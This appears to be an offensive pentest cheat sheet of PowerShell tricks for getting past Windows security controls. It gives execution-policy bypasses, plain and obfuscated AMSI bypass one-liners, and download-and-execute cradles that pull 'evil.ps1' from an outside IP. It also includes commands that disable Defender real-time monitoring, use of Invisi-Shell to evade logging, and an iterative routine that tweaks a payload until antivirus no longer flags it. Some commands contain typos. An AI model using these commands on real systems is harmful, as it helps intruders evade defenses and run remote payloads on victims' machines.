## Tricks to Bypass protections

### Execution Policy Protection
---
```powershell
C:> powershell -ExecutionPolicy bypass
C:> powershell -c <cmd>
C:> powershell -encodedcommand
C:> $env:PSExecutionPolicyPreference = "bypass"
```

### AMSI Bypass
---
Plain:
```powershell
C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
```
Obfuscation:
```powershell
C:> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### Memory Execution
---
```powershell
C:> iex New Object Net.WebClient DownloadString('https://webserver/payload.ps1')
```
```powershell
C:> $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible ==$False;$ie.navigate('http 192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```powershell
C:> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send;iex $h.responseText
```
```powershell
C:> $wr=[System.NET.WebRequest]::Create("http 192.168.230.1/evil.ps1")
C:> $r=$w. GetResponse()
C:> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
PSv3 Onwards:
```powershell
C:> iex (iwr 'http 192.168.230.1/evil.ps1')
```

### Disable Defender
---
Admin Privileges Required
```powershell
C:> Set-MpPreference -DisableIOAVProtection $true
C:> Set-MpPreference -Disablerealtimemonitoring $true
C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
```
### Invisi Shell
---
From the [Tool GitHub](https://github.com/OmerYa/Invisi-Shell): _Hide your powershell script in plain sight! Invisi-Shell bypasses all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking .Net assemblies. The hook is performed via CLR Profiler API._

- Having Admin Privileges:
```powershell
C:> RunWithPathAsAdmin.bat
```
- Non Admin:
```powershell
C:> RunWithRegistryNonAdmin.bat
```

### AMSI Trigger
---
To identify the part of a PowerShell script that is detected by AV. 
Simply provide the path to the script file to scan:
```powershell
C:> AmsiTrigger_x64.exe -i C: AD Tools Invoke PowerShellTcp_Detected.ps1
```
Steps:
- Scan using the tool
- Modify code snippet
- Reescan
- Repeat until we get as result "AMSI_RESULT_NOT_DETECTED" or "Blank"

### References
---
- [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/): Ways to Bypass AMSI
- [AMSI Trigger](https://github.com/RythmStick/AMSITrigger)
- [Invoke Obfuscation](https://github.com/danielbohannon/Invoke Obfuscation)
- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

